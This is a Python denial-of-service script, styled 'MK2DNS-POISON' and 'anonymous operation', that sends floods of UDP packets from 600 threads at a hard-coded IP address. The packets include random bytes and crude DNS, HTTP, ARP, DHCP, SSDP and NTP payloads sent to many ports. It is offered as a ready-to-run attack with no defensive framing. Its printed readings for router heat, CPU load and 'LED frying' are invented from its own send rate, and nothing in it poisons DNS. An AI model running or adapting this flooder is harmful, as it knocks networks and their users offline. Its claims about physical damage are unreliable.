import socket
import threading
import time
import random

target = "62.109.121.42"

# ==================== ANONYMOUS MK2 LOGGING FORMAT ====================
class MK2Logger:
    @staticmethod
    def header():
        print("╔══════════════════════════════════════════════════════════╗")
        print("║                    MK2DNS-POISON v2.0                   ║")
        print("║                 [ANONYMOUS OPERATION]                   ║")
        print("╚══════════════════════════════════════════════════════════╝")
    
    @staticmethod
    def status(pps, cpu, led, heat, effect):
        # Anonymous military-style logging
        lines = [
            f"[{time.strftime('%H:%M:%S')}] SYSTEM: MK2_ACTIVE",
            f"├─ TARGET: {target}",
            f"├─ PACKETS: {pps:,}/s",
            f"├─ CPU_LOAD: {cpu}%",
            f"├─ LED_CTRL: {led}%",
            f"├─ THERMAL: {heat}°C",
            f"└─ STATUS: {effect}"
        ]
        for line in lines:
            print(line)
        print("─" * 60)
    
    @staticmethod
    def warning(msg):
        print(f"[!] {msg}")
    
    @staticmethod
    def critical(msg):
        print(f"[‼] {msg}")

# ==================== MK2 PAYLOADS (EXPANDED) ====================
class MK2Payloads:
    @staticmethod
    def led_fryers():
        return [
            bytes([0x00] * 16 + [0xFF] * 16) * 4,
            bytes([0x55] * 64 + [0xAA] * 64),
            bytes([i % 256 for i in range(256)]),
            bytes([random.randint(0, 255) for _ in range(512)]),
        ]
    
    @staticmethod
    def cpu_killers():
        return [
            # DNS amplification
            b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01',
            # HTTP flood
            b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\nX-Forwarded-For: ' + 
            bytes([random.randint(1, 255) for _ in range(4)]) + b'\r\n\r\n',
            # ARP poison
            b'\xff\xff\xff\xff\xff\xff' + bytes([random.randint(0, 255) for _ in range(6)]) + 
            b'\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01',
        ]
    
    @staticmethod
    def memory_eaters():
        return [
            # DHCP storm
            b'\x01\x01\x06\x00' + random.randbytes(236),
            # Large payload
            random.randbytes(1024),
            # Pattern payload
            b'\x00' * 512 + b'\xFF' * 512,
        ]
    
    @staticmethod
    def signal_jammers():
        return [
            # SSDP
            b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: upnp:rootdevice\r\n\r\n',
            # NTP
            b'\x1b' + random.randbytes(47),
            # Random jam
            random.randbytes(256),
        ]

# ==================== MK2 THREAD TYPES ====================
class MK2Threads:
    def __init__(self):
        self.thread_count = 0
        self.thread_types = {
            'LED_FRY': 100,      # LED control threads
            'CPU_KILL': 150,     # CPU destruction threads  
            'MEM_EAT': 100,      # Memory consumption threads
            'SIG_JAM': 150,      # Signal jamming threads
            'PORT_FLOOD': 100,   # Port flooding threads
        }
        self.total_threads = sum(self.thread_types.values())  # 600 MK2 THREADS
    
    def start_all(self):
        print(f"[+] INITIALIZING MK2 THREAD ENGINE")
        print(f"[+] TOTAL THREADS: {self.total_threads}")
        
        # LED Fry Threads
        for i in range(self.thread_types['LED_FRY']):
            t = threading.Thread(target=self.led_fry_worker, args=(i,))
            t.daemon = True
            t.start()
            self.thread_count += 1
        
        # CPU Kill Threads
        for i in range(self.thread_types['CPU_KILL']):
            t = threading.Thread(target=self.cpu_kill_worker, args=(i,))
            t.daemon = True
            t.start()
            self.thread_count += 1
        
        # Memory Eat Threads
        for i in range(self.thread_types['MEM_EAT']):
            t = threading.Thread(target=self.mem_eat_worker, args=(i,))
            t.daemon = True
            t.start()
            self.thread_count += 1
        
        # Signal Jam Threads
        for i in range(self.thread_types['SIG_JAM']):
            t = threading.Thread(target=self.sig_jam_worker, args=(i,))
            t.daemon = True
            t.start()
            self.thread_count += 1
        
        # Port Flood Threads
        for i in range(self.thread_types['PORT_FLOOD']):
            t = threading.Thread(target=self.port_flood_worker, args=(i,))
            t.daemon = True
            t.start()
            self.thread_count += 1
        
        print(f"[+] THREADS DEPLOYED: {self.thread_count}")
    
    # ========== THREAD WORKERS ==========
    
    def led_fry_worker(self, worker_id):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payloads = MK2Payloads.led_fryers()
        ports = [53, 80, 443, 7547]
        
        while True:
            try:
                payload = random.choice(payloads)
                port = random.choice(ports)
                sock.sendto(payload, (target, port))
                global_stats['led_packets'] += 1
            except:
                pass
    
    def cpu_kill_worker(self, worker_id):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payloads = MK2Payloads.cpu_killers()
        
        while True:
            try:
                payload = random.choice(payloads)
                port = random.randint(1, 65535)
                sock.sendto(payload, (target, port))
                global_stats['cpu_packets'] += 1
            except:
                pass
    
    def mem_eat_worker(self, worker_id):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payloads = MK2Payloads.memory_eaters()
        
        while True:
            try:
                payload = random.choice(payloads)
                port = random.randint(1024, 65535)
                sock.sendto(payload, (target, port))
                global_stats['mem_packets'] += 1
            except:
                pass
    
    def sig_jam_worker(self, worker_id):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payloads = MK2Payloads.signal_jammers()
        ports = [1900, 123, 161, 162]
        
        while True:
            try:
                payload = random.choice(payloads)
                port = random.choice(ports)
                sock.sendto(payload, (target, port))
                global_stats['jam_packets'] += 1
            except:
                pass
    
    def port_flood_worker(self, worker_id):
        # Multiple sockets for port flooding
        socks = []
        for _ in range(5):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                socks.append(s)
            except:
                pass
        
        while True:
            try:
                sock = random.choice(socks)
                payload = random.randbytes(random.randint(64, 1024))
                
                # Flood multiple ports
                for _ in range(random.randint(3, 10)):
                    port = random.randint(1, 65535)
                    sock.sendto(payload, (target, port))
                    global_stats['flood_packets'] += 1
                    
            except:
                pass

# ==================== GLOBAL STATS ====================
global_stats = {
    'led_packets': 0,
    'cpu_packets': 0,
    'mem_packets': 0,
    'jam_packets': 0,
    'flood_packets': 0,
    'total_packets': 0,
}

# ==================== MAIN EXECUTION ====================
MK2Logger.header()
print(f"[+] TARGET ACQUIRED: {target}")
print(f"[+] MK2 PAYLOAD LIBRARY: LOADED")
print(f"[+] INITIALIZING 600 MK2 THREADS...")
print("─" * 60)

# Initialize and start MK2 threads
mk2_threads = MK2Threads()
mk2_threads.start_all()

# Monitor and logging loop
last_log = time.time()
attack_start = time.time()

while True:
    time.sleep(2)  # Log every 2 seconds
    
    # Calculate stats
    elapsed = time.time() - last_log
    last_log = time.time()
    
    # Get packet counts
    led_pps = int(global_stats['led_packets'] / elapsed) if elapsed > 0 else 0
    cpu_pps = int(global_stats['cpu_packets'] / elapsed) if elapsed > 0 else 0
    mem_pps = int(global_stats['mem_packets'] / elapsed) if elapsed > 0 else 0
    jam_pps = int(global_stats['jam_packets'] / elapsed) if elapsed > 0 else 0
    flood_pps = int(global_stats['flood_packets'] / elapsed) if elapsed > 0 else 0
    
    total_pps = led_pps + cpu_pps + mem_pps + jam_pps + flood_pps
    
    # Reset counters
    for key in global_stats:
        global_stats[key] = 0
    
    # Calculate attack metrics
    cpu_load = min(100, 20 + (total_pps / 300))
    led_control = min(100, (led_pps / max(total_pps, 1)) * 100)
    thermal = 45 + (total_pps / 1000)
    
    # Determine attack status
    if total_pps > 80000:
        status = "MAXIMUM DESTRUCTION"
    elif total_pps > 50000:
        status = "CRITICAL OVERLOAD"
    elif total_pps > 25000:
        status = "HIGH INTENSITY"
    elif total_pps > 10000:
        status = "MODERATE PRESSURE"
    else:
        status = "INITIALIZING"
    
    # Log with MK2 format
    MK2Logger.status(
        pps=total_pps,
        cpu=int(cpu_load),
        led=int(led_control),
        heat=int(thermal),
        effect=status
    )
    
    # Thread distribution display
    if int(time.time() - attack_start) % 10 == 0:  # Every 10 seconds
        print("[+] THREAD DISTRIBUTION:")
        print(f"   LED_FRY: {mk2_threads.thread_types['LED_FRY']} threads")
        print(f"   CPU_KILL: {mk2_threads.thread_types['CPU_KILL']} threads")
        print(f"   MEM_EAT: {mk2_threads.thread_types['MEM_EAT']} threads")
        print(f"   SIG_JAM: {mk2_threads.thread_types['SIG_JAM']} threads")
        print(f"   PORT_FLOOD: {mk2_threads.thread_types['PORT_FLOOD']} threads")
        print("─" * 60)
    
    # Critical warnings
    if thermal > 80:
        MK2Logger.critical("THERMAL CRITICAL - ROUTER OVERHEATING")
    if led_control > 70:
        MK2Logger.warning("LED CONTROL AT MAXIMUM - VISUAL FRYING ACTIVE")
    if cpu_load > 90:
        MK2Logger.warning("CPU LOAD CRITICAL - PROCESSOR MELTDOWN IMMINENT")
